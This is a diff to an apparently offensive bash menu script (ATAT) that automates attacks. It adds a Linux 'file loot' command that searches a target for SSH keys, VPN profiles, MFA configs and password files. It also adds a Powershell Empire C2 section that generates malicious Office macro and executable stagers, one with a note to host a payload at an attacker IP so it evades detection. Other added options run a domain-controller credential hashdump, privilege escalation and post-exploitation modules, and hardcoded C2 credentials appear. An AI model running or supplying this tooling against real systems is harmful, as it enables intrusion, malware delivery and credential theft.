-	#echo -e "\E[1;34m::::: \e[97mMetasploit install has, hopefully, completed successfully \E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mMetasploit install has, hopefully, completed successfully \E[1;34m:::::"
 
 	echo -e "\E[1;34m::::: \e[97mInstalling Asleap... \E[1;34m:::::"
 	git clone https://github.com/joswr1ght/asleap ~/asleap
@@ -1798,7 +1815,7 @@ reqs="gcc gcc-mingw-w64-i686 libnl-dev xterm openjdk-8-jdk aircrack-ng ethtool i
             ~/ATAT/ATAT.sh
             ;;
 		"Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
     esac
@@ -2014,7 +2031,7 @@ do
            ~/ATAT/ATAT.sh
             ;;
         "Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
     esac
@@ -2118,14 +2135,13 @@ do
     echo -e "\E[1;34m::::: \e[97mLeave This Blank & Hit ENTER If Your NIC Is Already In Monitor Mode) \E[1;34m:::::"
     echo ""
     airmon-ng start $usernic
-    ~/wifiphisher/bin/wifiphisher
-    
+    ~/wifiphisher/bin/wifiphisher    
 			;;
         "Main Menu")
             ~/ATAT/ATAT.sh
             ;;
         "Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
     esac
@@ -2137,8 +2153,8 @@ done
          
  echo -e "\E[1;34m::::: \e[97mPost Exploitation \E[1;34m:::::"
  
-PS3='Enter your choice: ENTER=Options Menu | 9=Main Menu | 10=QUIT: '
-options=("Push File To Target with SCP - Creds Required" "Data Exfiltration" "Push File To Target with PSH / Meterpreter" "Wireless Password Stealer" "Windows 64 bit Credenital & Loot Harvester" "Windows 32 bit Credenital & Loot Harvester" "Bashark" "Pupy" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 10=Main Menu | 11=QUIT: '
+options=("Push File To Target with SCP - Creds Required" "Data Exfiltration" "Push File To Target with PSH / Meterpreter" "Wireless Password Stealer" "Windows 64 bit Credenital & Loot Harvester" "Windows 32 bit Credenital & Loot Harvester" "Bashark" "Pupy" "*Nix File Loot Search" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -2266,11 +2282,32 @@ do
 	pupysh-update
 	pupysh
 		    ;;
+		"*Nix File Loot Search")
+	echo -e "\E[1;34m::::: \e[97mSearch For Interesting Files \E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mSearches For All \"Office\" docs (.doc(x), .odf, .ods, .xls(x), .ppt(x), .txt, .etc) \E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mSearches For All Script Files (Good For Finding Hardcoded Creds) \E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mSearches For DB Files, SSH Keys, PCAPs, OpenVPN Profiles, DUO MFA Configurations (Generate Valid TOTP MFA Codes!!) \E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mSearches For All Files With \"password\" In The File Name \E[1;34m:::::"
+
+
+		read -p "Would you like to search for all of the above [y|n]? " files
+		echo ""
+		
+			if [ "$files" == "y" ]; then
+				echo "find / -iname \"*.txt\" | tee -a file_looter.txt && find / -iname \"*.doc\" | tee -a file_looter.txt && find / -iname \"*.docx\" | tee -a file_looter.txt && find / -iname \"*.xlsx\" | tee -a file_looter.txt && find / -iname \"*.xls\" | tee -a file_looter.txt && find / -iname \"*.odf\" | tee -a file_looter.txt && find / -iname \"*.ppt\" | tee -a file_looter.txt && find / -iname \"*.pptx\" | tee -a file_looter.txt && find / -iname \"*.ods\" | tee -a file_looter.txt && find / -iname \"*.sql\" | tee -a file_looter.txt && find / -iname \"*.py\" | tee -a file_looter.txt && find / -iname \"*.sh\" | tee -a file_looter.txt && find / -iname \"*.pl\" | tee -a file_looter.txt && find / -iname \"*.rb\" | tee -a file_looter.txt && find / -iname \"*.go\" | tee -a file_looter.txt && find / -iname \"*.pcap\" | tee -a file_looter.txt && find / -iname \"*.ovpn\" | tee -a file_looter.txt && find / -iname \"id_rsa\" | tee -a file_looter.txt && find / -iname \"*.pub\" | tee -a file_looter.txt && find / -iname \"*duo.conf\" | tee -a file_looter.txt && find / -iname \"*password*.*\" | tee -a file_looter.txt"
+				echo -e "\E[1;34m::::: \e[97mRun This Command On Your Linux Target, Then Check \"file_looter.txt\" For Interesting Files \E[1;34m:::::"
+				read -p "Press any key to contiue" enter
+			else
+				echo -e "\e[1;34mReturn when you are ready to loot your *nix targets\e[0m"
+				echo ""
+				read -p "Press any key to contiue" enter
+			fi			
+		    ;;
         "Main Menu")
             ~/ATAT/ATAT.sh
             ;;
         "Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
     esac
@@ -2299,7 +2336,7 @@ do
             ~/ATAT/ATAT.sh
             ;;
         "Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
     esac
@@ -2405,7 +2442,7 @@ select opt in "${options[@]}"
             ~/ATAT/ATAT.sh
             ;;
         "Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
 		esac
@@ -2424,7 +2461,7 @@ select opt in "${options[@]}"
             ~/ATAT/ATAT.sh
             ;;
         "Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
     esac
@@ -2472,7 +2509,233 @@ do
             ~/ATAT/ATAT.sh
             ;;
         "Quit")
-            echo "Aufiederszehn" && exit 1
+            echo "auf Wiedersehen" && exit 1
+            ;;
+        *) echo invalid option;;
+    esac
+done
+
+;;
+
+   "15" | "15" )
+          
+echo -e "\E[1;34m::::: \e[97mBC-SECURITY Powershell Empire & Starkiller \E[1;34m:::::"
+echo -e "\E[1;34m::::: \e[97mEmpire & Starkiller MUST be installed in /root/!! \E[1;34m:::::"
+echo -e "\E[1;34m::::: \e[97mTHIS SECTION ONLY WORKS FROM THE /root/ CONTEXT!! \E[1;34m:::::"
+echo -e "\E[1;34m::::: \e[97mIF YOU'RE NOT LOGGED IN AS root, DO NOT USE THESE OPTIONS!! \E[1;34m:::::"
+echo -e "\E[1;34m::::: \e[97mAPI Features Are In BETA. Use Starkiller GUI! \E[1;34m:::::"
+
+PS3='Enter your choice: ENTER=Options Menu | 24=Main Menu | 25=QUIT: '
+options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2a - Launch Starkiller GUI In Parrot (Optional)" "Step 2b - Launch Starkiller GUI In Kali (Optional)" "Step 3 - Acquire PSE REST API Permanent Token (DEPRECATED)" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Execute Bloodhound Data Collection - Local" "Windows Post-Exploitation" "Windows DC Hashdump" "Linux/OSX Post-Exploitation" "Get Post Ex Results From PSE Agent" "Get PSE Stored Credentials" "Windows Privilege Escalation" "Linux/OSX Privilege Escalation" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit") #"Execute Bloodhound Data Collection - Remote"
+select opt in "${options[@]}"
+do
+    case $opt in
+        "Step 1 - Launch Powershell Empire & RESTful API")
+    # Start the Empire console & RESTful API
+	echo -e "\E[1;34m::::: \e[97mLaunching Powershell Empire & RESTful API \E[1;34m:::::"
+	cd ~/Empire && python3 empire --rest --username empireadmin --password Password123
+	outputfile=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST or localhost): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT or 1337): ' userport;
+    curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/admin/login -X POST -d '{"username":"'empireadmin'", "password":"'Password123'"}' | tee ~/ATAT/PSE_session_token_pre.txt
+	cat ~/ATAT/PSE_session_token_pre.txt | egrep -o '([a-zA-Z0-9]{40})' > $outputfile
+	rm ~/ATAT/PSE_session_token_pre.txt
+	        ;;
+        "Step 2a - Launch Starkiller GUI In Parrot (Optional)")
+    echo -e "\E[1;34m::::: \e[97mLaunching Starkiller GUI \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mEnter localhost:1337 (or C2IP:PORT) In Name Field Of Starkiller GUI \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mEnter empireadmin In Username Field Of Starkiller GUI \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mEnter Password123 In Password Field Of Starkiller GUI \E[1;34m:::::"
+    ./starkiller-1.2.2.AppImage --no-sandbox
+       	    ;;
+    	"Step 2b - Launch Starkiller GUI In Kali (Optional)")
+    echo -e "\E[1;34m::::: \e[97mLaunching Starkiller GUI \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mEnter localhost:1337 (or C2IP:PORT) In Name Field Of Starkiller GUI \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mEnter empireadmin In Username Field Of Starkiller GUI \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mEnter Password123 In Password Field Of Starkiller GUI \E[1;34m:::::"
+    ./starkiller-1.2.2.AppImage
+    	    ;;
+    	"Step 3 - Acquire PSE REST API Permanent Token (DEPRECATED)")
+    echo -e "\E[1;34m::::: \e[97mI'm Thinking The Permanent API Token Was Removed From The New Version \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mThis Is Not Necessary For Now \E[1;34m:::::"
+	#outputfile=~/ATAT/PSE_perm_token.txt
+    #inputfile=~/ATAT/PSE_session_token.txt
+    #read -p 'Set PSE C2 (LHOST or localhost): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT or 1337): ' userport;
+    #curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/admin/login -X POST -d '{"username":"'empireadmin'", "password":"'Password123'"}' | tee ~/ATAT/PSE_session_token_pre.txt
+	#cat ~/ATAT/PSE_session_token_pre.txt | egrep -o '([a-zA-Z0-9]{40})' > ~/ATAT/PSE_session_token.txt
+	#rm ~/ATAT/PSE_session_token_pre.txt
+    #curl --insecure -i https://$userlistener:$userport/api/admin/permanenttoken?token=$(cat $inputfile) | tee ~/ATAT/PSE_perm_token_pre.txt
+    #cat ~/ATAT/PSE_perm_token_pre.txt | egrep -o '([a-zA-Z0-9]{40})' > $outputfile
+    #rm ~/ATAT/PSE_perm_token_pre.txt
+			;;
+		"Start PSE Listener (DEPRECATED)")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Listener Name: ' userlname;
+		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/listeners/http?token=$(cat $pseauthtoken) -X POST -d '{"Name":"'$userlname'"}'
+            echo -e "\E[1;34m::::: \e[97mPSE Listener Has Been Created \E[1;34m:::::"
+			;;
+		"Get PSE Stagers")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; 
+		curl --insecure -i https://$userlistener:$userport/api/stagers?token=$(cat $pseauthtoken) | tee ~/ATAT/PSE_stagers_pre.txt
+		sed "/}}},{\"Author/s/}}},{\"Author/\"}}}, \r\n{\"Author\"/g" ~/ATAT/PSE_stagers_pre.txt > ~/ATAT/PSE_stagers.txt
+		rm ~/ATAT/PSE_stagers_pre.txt	
+            echo -e "\E[1;34m::::: \e[97mStagers have been saved to ~/ATAT/PSE_stagers.txt \E[1;34m:::::"
+			;;
+		"Get PSE Agents")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; 
+		curl --insecure -i https://$userlistener:$userport/api/agents?token=$(cat $pseauthtoken) | tee ~/ATAT/PSE_agents.txt	
+            echo -e "\E[1;34m::::: \e[97mAgents have been saved to ~/ATAT/PSE_agents.txt \E[1;34m:::::"
+			;;
+		"Rename PSE Agent")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent Name (Current): ' agentname; read -p 'Set New Name for PSE Agent: ' useragentname; 
+		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/agents/$agentname/rename?token=$(cat $pseauthtoken) -X POST -d '{"newname":'\"$useragentname\"'}'
+            echo -e "\E[1;34m::::: \e[97mAgents have been saved to ~/ATAT/PSE_agents.txt \E[1;34m:::::"
+			;;
+		"Generate PSE Stagers - Windows (mostly)")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    outputfile=~/ATAT/PSE_stager_launcher.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE listener name (http, DeathStar, etc.): ' userlistenername; read -p 'Select 1 of the following PSE Stagers ONLY (windows/backdoorLnkMacro, windows/teensy, windows/macro, windows/launcher_xml, windows/launcher_vbs, windows/launcher_sct, windows/launcher_bat, multi/macro): ' userstager;
+		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/stagers?token=$(cat $pseauthtoken) -X POST -d '{"StagerName":'\"$userstager\"', "Listener":'\"$userlistenername\"'}' | grep -Po '"Output":.*?[^\\]",' | sed 's/^.\{10\}//' | sed '$s/..$//' | tee ~/ATAT/PSE_stager_launcher_pre.txt
+		cat ~/ATAT/PSE_stager_launcher_pre.txt | base64 --decode > $outputfile
+		rm ~/ATAT/PSE_stager_launcher_pre.txt
+            echo -e "\E[1;34m::::: \e[97mStager output has been saved to ~/ATAT/PSE_stager_launcher.txt \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mSpecial Instructions for ""windows/backdoorLnkMacro"" - XLS macro (to be delivered to & run on vitcim machine) written to /tmp/default.xls  
+            Remember to add macro code from default.xls to any other XLS prior to use on victim. 
+            XML code that is called by the XLS macro has been written to /var/www/html/SfoLt.xml & ~/ATAT/PSE_stager_launcher.txt (for backup text copy)
+            This XML file must be accessible by the target at this url: http://<ATTACKER_IP>/SfoLt.xml 
+            The XLS macro (once run) will download the PSE powershell stager from within the XML code. 
+            This is done to defeat application-aware security measures that flag on launches of powershell from unexpected programs, such as a direct launch from office applications. As the macro is pure vba and does not leverage powershell it is less likely to be detected by these types of tools.\E[1;34m:::::"
+			;;
+		"Generate PSE Stagers - Windows/OSX/Linux")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    outputfile=~/ATAT/PSE_stager_launcher_multi.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE listener name (http, DeathStar, etc.): ' userlistenername; read -p 'Select 1 of the following PSE Stagers ONLY (windows/hta, windows/ducky, windows/bunny, osx/teensy, osx/safari_launcher, osx/macro, osx/launcher, osx/ducky, osx/applescript, multi/launcher, multi/bash ): ' userstager;
+		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/stagers?token=$(cat $pseauthtoken) -X POST -d '{"StagerName":'\"$userstager\"', "Listener":'\"$userlistenername\"'}' | grep -Po '"Output":.*?[^\\]",' | sed 's/^.\{10\}//' | sed '$s/..$//' | tee $outputfile
+            echo -e "\E[1;34m::::: \e[97mStager output has been saved to ~/ATAT/PSE_stager_launcher_multi.txt \E[1;34m:::::"
+			;;
+		"Generate PSE Stagers - MSWord File & CSharp Payload")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    outputfile=~/ATAT/PSE_stager_launcher_file.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE listener name (http, DeathStar, etc.): ' userlistenername; read -p 'Select 1 of the following PSE Stagers ONLY (windows/macroless_msword, windows/csharp_exe): ' userstager;
+		curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/stagers?token=$(cat $pseauthtoken) -X POST -d '{"StagerName":'\"$userstager\"', "Listener":'\"$userlistenername\"'}' | grep -Po '"Output":.*?[^\\]",' | sed 's/^.\{10\}//' | sed '$s/..$//' | tee $outputfile
+            echo -e "\E[1;34m::::: \e[97mStager output has been saved to ~/ATAT/PSE_stager_launcher_file.txt \E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mSpecial Instructions for ""windows/macroless_msword""
+            'empire.docx' and 'default.ps1' was created in the '/tmp/' directory \E[1;34m:::::"
+            echo ""
+            echo -e "\E[1;34m::::: \e[97mSpecial Instructions for ""windows/csharp_exe""
+            launcher.src.zip created in the '/tmp/' directory \E[1;34m:::::"
+			;;
+		"Execute Bloodhound Data Collection - Local")
+	echo -e "\E[1;34m::::: \e[97mBE CAREFUL - This Will Create CSV Files On The TARGET Machine In Your Current Directory That Will Need To Be Exfitrated & Imported Into BLoodhound Manually\E[1;34m:::::"
+	echo -e "\E[1;34m::::: \e[97mi.e., If Your PSE Launcher Ran From The User's Desktop, All CSV Files WILL APPEAR On Their Desktop...You Have Been Warned\E[1;34m:::::"
+	echo ""
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+	read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent; read -p 'Search Entire Forest? True/False ' userforest;
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/powershell/situational_awareness/network/bloodhound?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"',"SearchForest":'\"$userforest\"'}' >> ~/ATAT/Bloodhound_PSE.log
+	        echo -e "\E[1;34m::::: \e[97mxXx Bloodhound Data Collection Has Begun xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once The Background Task Has Been Completed\E[1;34m:::::"
+			;;
+    	"Windows Post-Exploitation")
+    inputfile=~/ATAT/PSE_windows_postex.txt
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
+	for MODULE in $(cat $inputfile)
+	do
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Windows_PSE_postex.log
+	sleep 10
+	done
+            echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been Pillaged xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
+			;;
+		"Windows DC Hashdump")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent; read -p 'Grab Only Active Accounts? True/False ' useractive; read -p 'Grab Entire Forest? True/False ' userforest;
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/powershell/credentials/mimikatz/dcsync_hashdump?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"',"Active":'\"$useractive\"',"Forest":'\"$userforest\"'}' >> ~/ATAT/WindowsDC_PSE_postex.log
+	        echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been Pillaged xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once The Background Task Has Been Completed\E[1;34m:::::"
+			;;
+		"Linux/OSX Post-Exploitation")
+    inputfile=~/ATAT/PSE_linux_osx_postex.txt
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
+	for MODULE in $(cat $inputfile)
+	do
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Linux_OSX_PSE_postex.log
+	sleep 10
+	done
+            echo -e "\E[1;34m::::: \e[97mxXx Python Agent Has Been Pillaged xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
+			;;
+		"Get Post Ex Results From PSE Agent")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'PSE Agent to Poll: ' useragent; 
+	curl --insecure -i https://$userlistener:$userport/api/agents/$useragent/results?token=$(cat $pseauthtoken)	| tee ~/ATAT/agent_results_pre.txt
+	awk '{gsub(/\\n/,"\n")}1' ~/ATAT/agent_results_pre.txt >> ~/ATAT/agent_results_pre1.txt #Remove "\n" from output and replace it with a new line
+	awk '{gsub(/\\r/,"\n")}1' ~/ATAT/agent_results_pre1.txt >> ~/ATAT/agent_results.txt #Remove "\r" from output and replace it with a new line
+	rm ~/ATAT/agent_results_pre*.txt
+            echo -e "\E[1;34m::::: \e[97mPSE Agent's Results Have Been Polled & Are Available In ~/ATAT/agent_results.txt\E[1;34m:::::"
+			;;
+		"Get PSE Stored Credentials")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; 
+	curl --insecure -i https://$userlistener:$userport/api/creds?token=$(cat $pseauthtoken) | tee ~/ATAT/PSE_creds.txt	
+            echo -e "\E[1;34m::::: \e[97mAgents have been saved to ~/ATAT/PSE_creds.txt \E[1;34m:::::"
+			;;
+		"Windows Privilege Escalation")
+    inputfile=~/ATAT/PSE_windows_privesc.txt
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
+	for MODULE in $(cat $inputfile)
+	do
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Windows_PSE_privesc.log
+	sleep 10
+	done
+            echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been (Hopefully) Escalated xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
+			;;	
+		"Linux/OSX Privilege Escalation")
+    inputfile=~/ATAT/PSE_linux_osx_privesc.txt
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
+	for MODULE in $(cat $inputfile)
+	do
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Linux_OSX_PSE_privesc.log
+	sleep 10
+	done
+            echo -e "\E[1;34m::::: \e[97mxXx Python Agent Has Been (Hopefully) Escalated xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
+			;;
+		"Kill PSE Listener")
+    pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Listener to Kill): ' userlistener; 
+	curl --insecure -i https://$userlistener:$userport/api/listeners/$userlistener?token=$(cat $pseauthtoken) -X DELETE	
+            echo -e "\E[1;34m::::: \e[97m\E[1;34m"$userlistener"\E[1;34m Has Been Killed \E[1;34m:::::"
+			;;
+		"Kill All PSE Listeners")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport;
+	curl --insecure -i https://$userlistener:$userport/api/listeners/all?token=$(cat $pseauthtoken) -X DELETE	
+            echo -e "\E[1;34m::::: \e[97mAll PSE Listeners Have Been Killed \E[1;34m:::::"
+			;;
+		"Restart PSE RESTful API")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport;	
+	curl --insecure -i https://$userlistener:$userport/api/admin/restart?token=$(cat $pseauthtoken)
+		echo -e "\E[1;34m::::: \e[97mPSE RESTful API Has Been Restarted \E[1;34m:::::"
+			;;
+		"Shutdown PSE RESTful API")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport;	
+    curl --insecure -i https://$userlistener:$userport/api/admin/shutdown?token=$(cat $pseauthtoken)
+		echo -e "\E[1;34m::::: \e[97mPSE RESTful API Has Been Shutdown \E[1;34m:::::"
+			;;
+		"Main Menu")
+           ~/ATAT/ATAT.sh
+            ;;
+        "Quit")
+            echo "auf Wiedersehen" && exit 1
             ;;
         *) echo invalid option;;
     esac
@@ -2505,7 +2768,7 @@ done
 "0" | "0" )
   # 
     echo -e "\E[1;34m::::: \e[97mIt's Over For Now... \E[1;34m:::::"
-    echo "Aufiederszehn" && exit 1 
+    echo "auf Wiedersehen" && exit 1 
 
 ;;
    
